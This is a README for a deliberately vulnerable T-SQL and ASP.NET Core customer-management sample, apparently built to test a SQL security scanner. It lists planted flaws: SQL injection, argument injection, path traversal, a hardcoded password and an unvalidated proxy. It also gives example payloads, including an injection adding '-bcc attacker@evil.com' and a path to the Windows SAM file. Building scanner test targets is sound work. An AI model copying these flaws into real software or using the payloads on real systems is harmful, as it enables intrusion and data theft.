# Customer Management System - SQL Server T-SQL Sample Application
se
A comprehensive sample application demonstrating SQL Server T-SQL stored procedures, functions, and triggers integrated with a C# .NET Core ASP.NET Core application. This system includes intentional security vulnerabilities for testing security scanners.

## Quick Start

### Prerequisitess

- **SQL Server**: 2019 or later (2022 recommended)
- **.NET**: 8.0 SDK or later
- **Visual Studio**: 2022 or Visual Studio Code with C# extension (optional)d
- **SQL Server Management Studio (SSMS)**: For database management (optional)
- **Git**: For cloning and version control

### Build Instructionss

#### Step 1: Set Up the Database

1. Create the database using SSMS or sqlcmd:

```sql
CREATE DATABASE [CustomerManagement]
GO
USE [CustomerManagement]
GO
```

1. Execute the database setup scripts in order:

```bash
sqlcmd -S YOUR_SERVER -U sa -P YOUR_PASSWORD -d CustomerManagement -i database/schema/01_tables.sql
sqlcmd -S YOUR_SERVER -U sa -P YOUR_PASSWORD -d CustomerManagement -i database/stored-procedures/customer_procedures.sql
sqlcmd -S YOUR_SERVER -U sa -P YOUR_PASSWORD -d CustomerManagement -i database/functions/customer_functions.sql
sqlcmd -S YOUR_SERVER -U sa -P YOUR_PASSWORD -d CustomerManagement -i database/triggers/customer_triggers.sql
```

Or use SSMS to execute the scripts interactively.

#### Step 2: Build the .NET Application

1. Navigate to the dotnet-app directory:

```bash
cd dotnet-app
```

1. Update the connection string in `appsettings.json`:

```json
"ConnectionStrings": {
  "CustomerManagementDb": "Server=YOUR_SERVER;Database=CustomerManagement;User Id=sa;Password=YOUR_PASSWORD;Encrypt=false;Trust Server Certificate=true;"
}
```

1. Restore dependencies:

```bash
dotnet restore
```

1. Build the application:

```bash
dotnet build
```

1. Run the application:

```bash
dotnet run
```

The API will be available at `https://localhost:5001` with Swagger UI at `https://localhost:5001/swagger`

#### Step 3: Verify Installation

Test the API with a simple request:

```bash
curl https://localhost:5001/api/customer
```

## SQL Server T-SQL Architecture

The system demonstrates SQL Server-specific features:

- **Stored Procedures**: Schema-bound procedure definitions with input/output parameters
- **Computed Columns**: Server-side calculated columns in tables
- **Triggers**: DML triggers for audit trails and data integrity (AFTER INSERT/UPDATE/DELETE)
- **User-Defined Functions**: Scalar and table-valued functions
- **Cursors**: Explicit cursor declarations with FETCH NEXT and WHILE loops
- **Exception Handling**: TRY...CATCH blocks for error management
- **String Concatenation**: `+` operator and CONCAT function
- **Dynamic SQL**: EXEC and sp_executesql for dynamic queries

## Project Structure

```shell
customer-system/
├── database/
│   ├── schema/
│   │   └── 01_tables.sql          # Database table definitions
│   ├── stored-procedures/
│   │   └── customer_procedures.sql # Stored procedures (CRUD, search, notifications, export)
│   ├── functions/
│   │   └── customer_functions.sql  # User-defined functions (calculations, validations)
│   ├── triggers/
│   │   └── customer_triggers.sql   # Triggers (audit, validation, updates)
│   └── setup.sql                   # Database initialization script (optional)
├── dotnet-app/
│   ├── CustomerManagement.csproj   # Project file
│   ├── Program.cs                  # Application entry point
│   ├── appsettings.json            # Configuration
│   ├── Models/
│   │   ├── Customer.cs             # Customer entity
│   │   ├── Order.cs                # Order and OrderItem entities
│   │   └── AuditLog.cs             # Audit and support ticket entities
│   ├── Controllers/
│   │   ├── CustomerController.cs   # Customer REST endpoints
│   │   ├── AuditController.cs      # Audit operation endpoints
│   │   └── SecurityController.cs   # Security/auth endpoints
│   ├── Services/
│   │   ├── ICustomerService.cs     # Customer business logic interface
│   │   └── CustomerService.cs      # Customer, audit, and security implementations
│   ├── Repositories/
│   │   ├── ICustomerRepository.cs  # Repository interfaces
│   │   └── CustomerRepository.cs   # ADO.NET implementations
│   └── Tests/
│       └── (Unit tests optional)
└── README.md
```

## Database Schema

### Tables

- **Customers**: Customer records with contact information and status
- **Orders**: Customer orders with order tracking
- **OrderItems**: Individual items within orders
- **SupportTickets**: Customer support tickets with priority and assignment
- **CommunicationLog**: Log of communications (email, SMS, webhook)
- **SystemCredentials**: Storage for service account credentials
- **AuditLog**: Audit trail of all database operations
- **UserSessions**: Customer session management

### Stored Procedures

| Procedure | Purpose | Vulnerability |
| ----------- | --------- | --------------- |
| `SearchCustomers` | Search for customers | CWE-89 (SQL Injection) |
| `CreateCustomer` | Create new customer | None (Safe) |
| `UpdateCustomerInfo` | Update customer info | None (Safe) |
| `ProcessOrder` | Process customer order | CWE-89 (SQL Injection) |
| `SendCustomerNotification` | Send notifications | CWE-88 (Argument Injection), CWE-441 (Web Proxy) |
| `ExportCustomerData` | Export data to file | CWE-73 (Path Manipulation) |
| `GetCustomerOrders` | Retrieve customer orders | None (Safe) |
| `CreateSupportTicket` | Create support ticket | None (Safe) |
| `LogAuditAction` | Log audit events | None (Safe) |
| `ValidateCustomerSession` | Create/validate session | CWE-798 (Hardcoded Credentials) |

### Functions

| Function | Purpose | Notes |
| ---------- | --------- | ------- |
| `CalculateCustomerLifetimeValue` | Calculate total customer value | Safe implementation |
| `GetCustomerStatus` | Convert status code to text | Safe implementation |
| `ValidateCustomerAccess` | Check resource access | Mixed safe/vulnerable patterns |
| `GetCustomerDetails` | Get formatted customer info | Safe implementation |
| `CalculateOrderDiscount` | Calculate tiered discounts | Safe implementation |
| `GetSupportTicketPriority` | Convert priority to text | Safe implementation |
| `CalculateDaysSinceRegistration` | Calculate customer tenure | Safe implementation |
| `GetOpenTicketCount` | Count open support tickets | Safe implementation |

### Triggers

- `trg_Customer_Audit`: Audit all customer changes
- `trg_Order_Validate`: Validate order data integrity
- `trg_SupportTicket_ChangeLog`: Track support ticket changes
- `trg_CommunicationLog_Status`: Log communication failures
- `trg_OrderItem_SummarizeOrder`: Auto-update order totals
- `trg_Customer_Deactivation`: Handle customer deactivation cascade

## Security Vulnerabilities Included

### CWE-89: SQL Injection

- **Location**: `SearchCustomers` procedure (and C# `SearchCustomersAsync` method)
- **Issue**: User input concatenated directly into WHERE clause
- **Example Attack**: `"Email LIKE '%@example.com' OR 1=1--"`

### CWE-88: Argument Injection

- **Location**: `SendCustomerNotification` procedure
- **Issue**: Email parameters concatenated without escaping
- **Example Attack**: `recipient = "test@example.com\" -bcc attacker@evil.com \""`

### CWE-73: Path Manipulation

- **Location**: `ExportCustomerData` procedure and `ExportAuditDataAsync` service
- **Issue**: File paths used directly without validation
- **Example Attack**: `"../../windows/system32/config/sam"`

### CWE-798: Hardcoded Credentials

- **Location**: `ValidateCustomerSession` procedure and `AuthenticateCustomerAsync` service
- **Issue**: Service account password hardcoded in source
- **Value**: `ServiceAcct@2024!#`

### CWE-441: Unintended Web Service Proxy

- **Location**: `SendCustomerNotification` procedure
- **Issue**: Unvalidated external URL contact
- **Endpoint**: `http://notification-service.example.com/notify`

## Database Setup

### Installation

1. Create the database:

```sql
CREATE DATABASE [CustomerManagement]
GO
USE [CustomerManagement]
GO
```

1. Run the schema creation script:

```sql
-- Execute database/schema/01_tables.sql
```

1. Create stored procedures:

```sql
-- Execute database/stored-procedures/customer_procedures.sql
```

1. Create functions:

```sql
-- Execute database/functions/customer_functions.sql
```

1. Create triggers:

```sql
-- Execute database/triggers/customer_triggers.sql
```

## .NET Application Setup

### Setup Prerequisites

- .NET 8.0 SDK or later
- Visual Studio 2022 or Visual Studio Code

### Setup Installation

1. Navigate to the dotnet-app directory:

```bash
cd dotnet-app
```

1. Update connection string in `appsettings.json`:

```json
"ConnectionStrings": {
  "CustomerManagementDb": "Server=localhost;Database=CustomerManagement;User Id=sa;Password=YourPassword;Encrypt=false;Trust Server Certificate=true;"
}
```

1. Restore dependencies:

```bash
dotnet restore
```

1. Build the application:

```bash
dotnet build
```

1. Run the application:

```bash
dotnet run
```

The API will be available at `https://localhost:5001` with Swagger UI at `https://localhost:5001/swagger`

## API Endpoints

### Customer Operations

- `GET /api/customer` - Get all customers
- `GET /api/customer/{customerId}` - Get specific customer
- `POST /api/customer` - Create new customer
- `PUT /api/customer/{customerId}` - Update customer
- `DELETE /api/customer/{customerId}` - Delete customer
- `POST /api/customer/search` - Search customers (vulnerable)
- `GET /api/customer/{customerId}/lifetime-value` - Get lifetime value

### Audit Operations

- `GET /api/audit/logs/{tableName}` - Get audit logs
- `POST /api/audit/export` - Export audit data (vulnerable)
- `POST /api/audit/send-email` - Send audit email (vulnerable)
- `GET /api/audit/summary` - Get audit summary

### Security Operations

- `POST /api/security/login` - Authenticate (hardcoded credentials)
- `POST /api/security/session` - Create session
- `POST /api/security/validate-access` - Validate resource access (vulnerable)
- `POST /api/security/logout` - End session

## Testing with SQL Scanner

### SQL Simple Scanner

To scan the T-SQL files for security vulnerabilities:

```bash
# Build the scanner (from parent directory)
./gradlew shadowJar

# Scan the stored procedures
java -jar build/libs/SqlScanner-all.jar \
  --inputFile samples/tsql/customer-system/database/stored-procedures/customer_procedures.sql \
  --resultsFile customer-procedures-results.xml

# Scan the functions
java -jar build/libs/SqlScanner-all.jar \
  --inputFile samples/tsql/customer-system/database/functions/customer_functions.sql \
  --resultsFile customer-functions-results.xml

# Scan the schema
java -jar build/libs/SqlScanner-all.jar \
  --inputFile samples/tsql/customer-system/database/schema/01_tables.sql \
  --resultsFile customer-schema-results.xml
```

### Expected Scanner Findings

#### Critical Vulnerabilities

##### CWE-89 (SQL Injection)

- SearchCustomers: Dynamic WHERE clause concatenation
- ProcessOrder: Dynamic INSERT statement concatenation
- Location: customer_procedures.sql lines ~12-18 and ~62-68

##### CWE-798 (Hardcoded Credentials)

- ValidateCustomerSession: Password hardcoded
- Location: customer_procedures.sql line ~180

#### High Vulnerabilities

##### CWE-88 (Argument Injection)

- SendCustomerNotification: Email parameters concatenated
- Location: customer_procedures.sql line ~110

##### CWE-73 (Path Manipulation)**

- ExportCustomerData: File path used directly
- Location: customer_procedures.sql line ~144

##### CWE-441 (Unintended Web Service Proxy)

- SendCustomerNotification: Unvalidated HTTP endpoint
- Location: customer_procedures.sql line ~118

## Architecture Notes

### Database Layer

- Uses stored procedures as the primary interface to the database
- Stored procedures handle data validation and business logic
- Triggers enforce data integrity and audit trails
- Mix of parameterized (safe) and dynamic (vulnerable) SQL

### Application Layer

- ASP.NET Core REST API with dependency injection
- Repository pattern abstracts database access
- Service layer implements business logic
- Controllers handle HTTP request/response

### Data Access

- Uses ADO.NET with SqlCommand for stored procedure calls
- Implements parameterized queries for CRUD operations
- SearchCustomersAsync demonstrates parameter passing to vulnerable SP

## Notes for Testing

- This sample intentionally includes security vulnerabilities
- DO NOT use this code in production
- The vulnerabilities are marked with `CWEID` comments for identification
- Safe implementation patterns are shown alongside vulnerable ones
- All database operations are logged via triggers for audit testing

## Related Projects

- **HR System (PL/SQL)**: Similar architecture for Oracle database
  - Location: `../plsql/hr-system/`
  - Language: Oracle PL/SQL with Java/Spring backend

## Support

For issues or questions about this sample application, refer to the main project documentation or SQL scanner documentation.
